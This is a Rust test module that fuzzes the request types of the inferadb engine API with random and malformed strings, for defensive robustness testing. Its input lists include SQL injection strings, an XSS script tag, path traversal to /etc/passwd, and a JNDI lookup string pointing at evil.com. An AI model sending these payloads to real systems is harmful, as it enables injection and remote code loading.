//! API Endpoint Fuzzing Tests
//!
//! These tests use property-based testing to fuzz API endpoints with random inputs,
//! ensuring robustness against malformed requests, edge cases, and potential security issues.
//!
//! # Smoke vs Fuzz Testing
//!
//! This module implements a two-tier testing approach:
//!
//! | Test Type | Prefix | Iterations | When Runs |
//! |-----------|--------|------------|-----------|
//! | Smoke | `smoke_*` | 5 (fixed seed) | Always (default CI) |
//! | Fuzz | `fuzz_*` | 50-500 | Only with `test-full` feature |
//!
//! **Smoke tests** provide fast feedback with deterministic inputs, ensuring
//! code paths are exercised without the overhead of full fuzzing. They use
//! fixed seeds for reproducibility.
//!
//! **Fuzz tests** provide comprehensive coverage with random inputs. They're
//! gated behind the `test-full` feature to avoid slowing down regular CI.
//!
//! # Running Tests
//!
//! ```bash
//! # Run smoke tests only (default)
//! cargo test --package inferadb-engine-api
//!
//! # Run both smoke and full fuzz tests
//! cargo test --package inferadb-engine-api --features test-full
//!
//! # Adjust fuzz case count via environment
//! PROPTEST_CASES=100 cargo test --package inferadb-engine-api --features test-full
//! ```

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use inferadb_engine_api::grpc::proto::{
    DeleteRelationshipsRequest, EvaluateRequest as ProtoEvaluateRequest,
    Relationship as ProtoRelationship, WriteRelationshipsRequest,
};
use inferadb_engine_test_fixtures::smoke::smoke_runner;
use proptest::prelude::*;

/// Generate arbitrary strings with various problematic characters
fn arb_string() -> impl Strategy<Value = String> {
    prop_oneof![
        // Normal strings
        "[a-zA-Z0-9_:-]{1,100}",
        // Empty string
        Just(String::new()),
        // Very long strings
        prop::collection::vec(any::<char>(), 1000..2000).prop_map(|v| v.into_iter().collect()),
        // Strings with special characters
        "[!@#$%^&*(){}\\[\\];:'\"<>,.?/|\\\\]{1,50}",
        // Unicode strings
        "\\PC{1,50}",
        // SQL injection attempts
        Just("'; DROP TABLE users; --".to_string()),
        Just("1' OR '1'='1".to_string()),
        // XSS attempts
        Just("<script>alert('xss')</script>".to_string()),
        // Path traversal attempts
        Just("../../../etc/passwd".to_string()),
        Just("..\\..\\..\\windows\\system32".to_string()),
        // Null bytes and control characters
        prop::collection::vec(0u8..32u8, 1..20)
            .prop_map(|v| { String::from_utf8(v).unwrap_or_else(|_| String::from("invalid")) }),
    ]
}

/// Generate arbitrary relationships for fuzzing
fn arb_relationship() -> impl Strategy<Value = ProtoRelationship> {
    (arb_string(), arb_string(), arb_string())
        .prop_map(|(resource, relation, subject)| ProtoRelationship { resource, relation, subject })
}

// =============================================================================
// SMOKE TESTS
// =============================================================================
// These tests run by default with fixed seeds and 5 iterations.
// They verify the same code paths as fuzz tests but with minimal overhead.

/// Smoke test for CheckRequest - verifies request construction
#[test]
fn smoke_check_request() {
    let mut runner = smoke_runner();

    runner
        .run(&(arb_string(), arb_string(), arb_string()), |(subject, resource, permission)| {
            let request =
                ProtoEvaluateRequest { subject, resource, permission, context: None, trace: None };

            prop_assert!(request.subject.len() <= 10000);
            prop_assert!(request.resource.len() <= 10000);
            prop_assert!(request.permission.len() <= 10000);
            Ok(())
        })
        .expect("smoke test failed");
}

/// Smoke test for WriteRelationshipsRequest - verifies batch construction
#[test]
fn smoke_write_request() {
    let mut runner = smoke_runner();

    runner
        .run(&prop::collection::vec(arb_relationship(), 0..100), |relationships| {
            let request = WriteRelationshipsRequest { relationships: relationships.clone() };

            prop_assert!(request.relationships.len() <= 100);
            for tuple in &request.relationships {
                prop_assert!(tuple.resource.len() <= 10000);
                prop_assert!(tuple.relation.len() <= 10000);
                prop_assert!(tuple.subject.len() <= 10000);
            }
            Ok(())
        })
        .expect("smoke test failed");
}

/// Smoke test for DeleteRelationshipsRequest - verifies delete construction
#[test]
fn smoke_delete_request() {
    let mut runner = smoke_runner();

    runner
        .run(&prop::collection::vec(arb_relationship(), 0..100), |relationships| {
            let request = DeleteRelationshipsRequest {
                filter: None,
                relationships: relationships.clone(),
                limit: None,
            };

            prop_assert!(request.relationships.len() <= 100);
            for tuple in &request.relationships {
                prop_assert!(tuple.resource.len() <= 10000);
                prop_assert!(tuple.relation.len() <= 10000);
                prop_assert!(tuple.subject.len() <= 10000);
            }
            Ok(())
        })
        .expect("smoke test failed");
}

/// Smoke test for long fields - verifies size handling
#[test]
fn smoke_long_fields() {
    let mut runner = smoke_runner();

    runner
        .run(&(0usize..10000), |length| {
            let long_string = "a".repeat(length);
            let request = ProtoEvaluateRequest {
                subject: long_string.clone(),
                resource: long_string.clone(),
                permission: long_string,
                context: None,
                trace: None,
            };

            prop_assert_eq!(request.subject.len(), length);
            Ok(())
        })
        .expect("smoke test failed");
}

/// Smoke test for nested references - verifies depth handling
#[test]
fn smoke_nested_references() {
    let mut runner = smoke_runner();

    runner
        .run(&(0usize..20), |depth| {
            let mut object = String::from("root");
            for i in 0..depth {
                object = format!("{}:level{}", object, i);
            }

            let request = ProtoEvaluateRequest {
                subject: "user:test".to_string(),
                resource: object.clone(),
                permission: "viewer".to_string(),
                context: None,
                trace: None,
            };

            prop_assert!(request.resource.contains("root"));
            Ok(())
        })
        .expect("smoke test failed");
}

/// Smoke test for special characters - verifies char handling
#[test]
fn smoke_special_chars() {
    let mut runner = smoke_runner();

    runner
        .run(&"[!@#$%^&*(){}\\[\\];:'\"<>,.?/|\\\\]{1,20}", |special| {
            let request = ProtoEvaluateRequest {
                subject: format!("user:{}", special),
                resource: format!("doc:{}", special),
                permission: special.clone(),
                context: None,
                trace: None,
            };

            prop_assert!(!request.subject.is_empty());
            Ok(())
        })
        .expect("smoke test failed");
}

/// Smoke test for batch sizes - verifies size scaling
#[test]
fn smoke_batch_size() {
    let mut runner = smoke_runner();

    runner
        .run(&(0usize..1000), |count| {
            let relationships: Vec<ProtoRelationship> = (0..count)
                .map(|i| ProtoRelationship {
                    resource: format!("obj{}", i),
                    relation: "rel".to_string(),
                    subject: format!("user{}", i),
                })
                .collect();

            let request = WriteRelationshipsRequest { relationships: relationships.clone() };

            prop_assert_eq!(request.relationships.len(), count);
            Ok(())
        })
        .expect("smoke test failed");
}

/// Smoke test for unicode - verifies unicode handling
#[test]
fn smoke_unicode() {
    let mut runner = smoke_runner();

    runner
        .run(&"\\PC{1,50}", |unicode| {
            let request = ProtoEvaluateRequest {
                subject: format!("user:{}", unicode),
                resource: format!("doc:{}", unicode),
                permission: "viewer".to_string(),
                context: None,
                trace: None,
            };

            prop_assert!(!request.subject.is_empty());
            Ok(())
        })
        .expect("smoke test failed");
}

/// Smoke test for injection patterns - verifies security handling
#[test]
fn smoke_injection_patterns() {
    let mut runner = smoke_runner();

    let strategy = prop_oneof![
        Just("'; DROP TABLE relationships; --"),
        Just("1' OR '1'='1"),
        Just("<script>alert('xss')</script>"),
        Just("${jndi:ldap://evil.com/a}"),
        Just("../../etc/passwd"),
        Just("\\x00\\x01\\x02"),
    ];

    runner
        .run(&strategy, |pattern| {
            let request = ProtoEvaluateRequest {
                subject: pattern.to_string(),
                resource: pattern.to_string(),
                permission: pattern.to_string(),
                context: None,
                trace: None,
            };

            prop_assert!(request.subject.len() < 1000);
            Ok(())
        })
        .expect("smoke test failed");
}

/// Smoke test for whitespace - verifies whitespace handling
#[test]
fn smoke_whitespace() {
    let mut runner = smoke_runner();

    let strategy = prop_oneof![
        Just(""),
        Just(" "),
        Just("  "),
        Just("\t"),
        Just("\n"),
        Just("\r\n"),
        Just("   \t\n\r  "),
    ];

    runner
        .run(&strategy, |ws| {
            let request = ProtoEvaluateRequest {
                subject: ws.to_string(),
                resource: ws.to_string(),
                permission: ws.to_string(),
                context: None,
                trace: None,
            };

            prop_assert!(request.subject.len() < 100);
            Ok(())
        })
        .expect("smoke test failed");
}

/// Smoke test for mixed tuples - verifies mixed valid/invalid handling
#[test]
fn smoke_mixed_tuples() {
    let mut runner = smoke_runner();

    runner
        .run(&(0usize..50, 0usize..50), |(valid_count, invalid_count)| {
            let mut relationships = Vec::new();

            for i in 0..valid_count {
                relationships.push(ProtoRelationship {
                    resource: format!("doc:{}", i),
                    relation: "viewer".to_string(),
                    subject: format!("user:{}", i),
                });
            }

            for i in 0..invalid_count {
                relationships.push(ProtoRelationship {
                    resource: format!("!@#{}", i),
                    relation: "".to_string(),
                    subject: ";;;".to_string(),
                });
            }

            let request = WriteRelationshipsRequest { relationships };

            prop_assert_eq!(request.relationships.len(), valid_count + invalid_count);
            Ok(())
        })
        .expect("smoke test failed");
}

/// Smoke test for field separators - verifies separator handling
#[test]
fn smoke_field_separators() {
    let mut runner = smoke_runner();

    runner
        .run(&(0usize..100), |sep_count| {
            let separators = ":".repeat(sep_count);
            let request = ProtoEvaluateRequest {
                subject: format!("user{}", separators),
                resource: format!("doc{}", separators),
                permission: "viewer".to_string(),
                context: None,
                trace: None,
            };

            prop_assert_eq!(request.subject.matches(':').count(), sep_count);
            Ok(())
        })
        .expect("smoke test failed");
}

// =============================================================================
// FULL FUZZ TESTS
// =============================================================================
// These tests run only with `--features test-full` and use many more iterations
// with random seeds for comprehensive coverage.

#[cfg(feature = "test-full")]
mod fuzz_tests {
    use inferadb_engine_test_fixtures::proptest_config::test_cases;

    use super::*;

    proptest! {
        #![proptest_config(ProptestConfig::with_cases(test_cases()))]

        /// Fuzz CheckRequest with arbitrary inputs
        #[test]
        fn fuzz_check_request(
            subject in arb_string(),
            resource in arb_string(),
            permission in arb_string(),
        ) {
            // Create a check request with fuzzed inputs
            let request = ProtoEvaluateRequest {
                subject,
                resource,
                permission,
                context: None,
                trace: None,
            };

            // The request should be constructible without panicking
            // Validation errors are acceptable, panics are not
            assert!(request.subject.len() <= 10000);
            assert!(request.resource.len() <= 10000);
            assert!(request.permission.len() <= 10000);
        }

        /// Fuzz WriteRelationshipsRequest with arbitrary relationships
        #[test]
        fn fuzz_write_request(relationships in prop::collection::vec(arb_relationship(), 0..100)) {
            // Create a write request with fuzzed relationships
            let request = WriteRelationshipsRequest {
                relationships: relationships.clone(),
            };

            // Should construct without panicking
            assert!(request.relationships.len() <= 100);

            // Each tuple should have reasonable field sizes
            for tuple in &request.relationships {
                assert!(tuple.resource.len() <= 10000);
                assert!(tuple.relation.len() <= 10000);
                assert!(tuple.subject.len() <= 10000);
            }
        }

        /// Fuzz DeleteRelationshipsRequest with arbitrary relationships
        #[test]
        fn fuzz_delete_request(relationships in prop::collection::vec(arb_relationship(), 0..100)) {
            // Create a delete request with fuzzed relationships
            let request = DeleteRelationshipsRequest {
                filter: None,
                relationships: relationships.clone(),
                limit: None,
            };

            // Should construct without panicking
            assert!(request.relationships.len() <= 100);

            // Each tuple should have reasonable field sizes
            for tuple in &request.relationships {
                assert!(tuple.resource.len() <= 10000);
                assert!(tuple.relation.len() <= 10000);
                assert!(tuple.subject.len() <= 10000);
            }
        }

        /// Fuzz request with very long field values
        #[test]
        fn fuzz_long_fields(length in 0usize..10000) {
            let long_string = "a".repeat(length);

            let request = ProtoEvaluateRequest {
                subject: long_string.clone(),
                resource: long_string.clone(),
                permission: long_string,
                context: None,
                trace: None,
            };

            // Should construct without panicking
            assert_eq!(request.subject.len(), length);
        }

        /// Fuzz with nested object references
        #[test]
        fn fuzz_nested_references(depth in 0usize..20) {
            let mut object = String::from("root");
            for i in 0..depth {
                object = format!("{}:level{}", object, i);
            }

            let request = ProtoEvaluateRequest {
                subject: "user:test".to_string(),
                resource: object.clone(),
                permission: "viewer".to_string(),
                context: None,
                trace: None,
            };

            // Should construct without panicking
            assert!(request.resource.contains("root"));
        }

        /// Fuzz with special characters in identifiers
        #[test]
        fn fuzz_special_chars(special in "[!@#$%^&*(){}\\[\\];:'\"<>,.?/|\\\\]{1,20}") {
            let request = ProtoEvaluateRequest {
                subject: format!("user:{}", special),
                resource: format!("doc:{}", special),
                permission: special,
                context: None,
                trace: None,
            };

            // Should construct without panicking
            assert!(!request.subject.is_empty());
        }

        /// Fuzz batch operations with varying sizes
        #[test]
        fn fuzz_batch_size(count in 0usize..1000) {
            let relationships: Vec<ProtoRelationship> = (0..count)
                .map(|i| ProtoRelationship {
                    resource: format!("obj{}", i),
                    relation: "rel".to_string(),
                    subject: format!("user{}", i),
                })
                .collect();

            let request = WriteRelationshipsRequest {
                relationships: relationships.clone(),
            };

            // Should construct without panicking
            assert_eq!(request.relationships.len(), count);
        }

        /// Fuzz with Unicode characters
        #[test]
        fn fuzz_unicode(unicode in "\\PC{1,50}") {
            let request = ProtoEvaluateRequest {
                subject: format!("user:{}", unicode),
                resource: format!("doc:{}", unicode),
                permission: "viewer".to_string(),
                context: None,
                trace: None,
            };

            // Should handle Unicode gracefully
            assert!(!request.subject.is_empty());
        }

        /// Fuzz with potential injection patterns
        #[test]
        fn fuzz_injection_patterns(pattern in prop_oneof![
            Just("'; DROP TABLE relationships; --"),
            Just("1' OR '1'='1"),
            Just("<script>alert('xss')</script>"),
            Just("${jndi:ldap://evil.com/a}"),
            Just("../../etc/passwd"),
            Just("\\x00\\x01\\x02"),
        ]) {
            let request = ProtoEvaluateRequest {
                subject: pattern.to_string(),
                resource: pattern.to_string(),
                permission: pattern.to_string(),
                context: None,
                trace: None,
            };

            // Should construct without panicking (validation can reject, but no crashes)
            assert!(request.subject.len() < 1000);
        }

        /// Fuzz with whitespace and empty strings
        #[test]
        fn fuzz_whitespace(ws in prop_oneof![
            Just(""),
            Just(" "),
            Just("  "),
            Just("\t"),
            Just("\n"),
            Just("\r\n"),
            Just("   \t\n\r  "),
        ]) {
            let request = ProtoEvaluateRequest {
                subject: ws.to_string(),
                resource: ws.to_string(),
                permission: ws.to_string(),
                context: None,
                trace: None,
            };

            // Should construct without panicking
            // Empty fields might be invalid, but shouldn't crash
            prop_assert!(request.subject.len() < 100);
        }

        /// Fuzz with mixed valid and invalid tuples
        #[test]
        fn fuzz_mixed_tuples(
            valid_count in 0usize..50,
            invalid_count in 0usize..50,
        ) {
            let mut relationships = Vec::new();

            // Add valid relationships
            for i in 0..valid_count {
                relationships.push(ProtoRelationship {
                    resource: format!("doc:{}", i),
                    relation: "viewer".to_string(),
                    subject: format!("user:{}", i),
                });
            }

            // Add potentially invalid relationships
            for i in 0..invalid_count {
                relationships.push(ProtoRelationship {
                    resource: format!("!@#{}", i),
                    relation: "".to_string(),
                    subject: ";;;".to_string(),
                });
            }

            let request = WriteRelationshipsRequest {
                relationships,
            };

            // Should construct without panicking
            assert_eq!(request.relationships.len(), valid_count + invalid_count);
        }

        /// Fuzz with extremely nested field separators
        #[test]
        fn fuzz_field_separators(sep_count in 0usize..100) {
            let separators = ":".repeat(sep_count);
            let request = ProtoEvaluateRequest {
                subject: format!("user{}", separators),
                resource: format!("doc{}", separators),
                permission: "viewer".to_string(),
                context: None,
                trace: None,
            };

            // Should construct without panicking
            assert_eq!(request.subject.matches(':').count(), sep_count);
        }
    }
}

/// Integration test: Verify API handles fuzzed inputs gracefully
#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod integration_tests {
    use super::*;

    #[test]
    fn test_api_resilience_to_malformed_input() {
        // Create various malformed requests
        let malformed_requests = vec![
            ProtoEvaluateRequest {
                subject: "".to_string(),
                resource: "".to_string(),
                permission: "".to_string(),
                context: None,
                trace: None,
            },
            ProtoEvaluateRequest {
                subject: "a".repeat(10000),
                resource: "b".repeat(10000),
                permission: "c".repeat(10000),
                context: None,
                trace: None,
            },
            ProtoEvaluateRequest {
                subject: "user:alice".to_string(),
                resource: "../../../etc/passwd".to_string(),
                permission: "'; DROP TABLE users; --".to_string(),
                context: None,
                trace: None,
            },
        ];

        // All requests should be constructible
        for req in malformed_requests {
            assert!(req.subject.len() <= 10000);
            assert!(req.resource.len() <= 10000);
            assert!(req.permission.len() <= 10000);
        }
    }

    #[test]
    fn test_tuple_validation_resilience() {
        // Create relationships with problematic data
        let problematic_relationships = vec![
            ProtoRelationship {
                resource: "\0\0\0".to_string(),
                relation: "rel".to_string(),
                subject: "user".to_string(),
            },
            ProtoRelationship {
                resource: "<script>".to_string(),
                relation: "../../".to_string(),
                subject: "'; DROP--".to_string(),
            },
        ];

        // Should construct without crashing
        for rel in problematic_relationships {
            assert!(!rel.resource.is_empty());
        }
    }

    #[test]
    fn test_batch_operation_limits() {
        // Test with maximum reasonable batch size
        let large_batch: Vec<ProtoRelationship> = (0..10000)
            .map(|i| ProtoRelationship {
                resource: format!("obj{}", i),
                relation: "rel".to_string(),
                subject: format!("user{}", i),
            })
            .collect();

        let request = WriteRelationshipsRequest { relationships: large_batch };

        // Should construct without panicking
        assert_eq!(request.relationships.len(), 10000);
    }
}
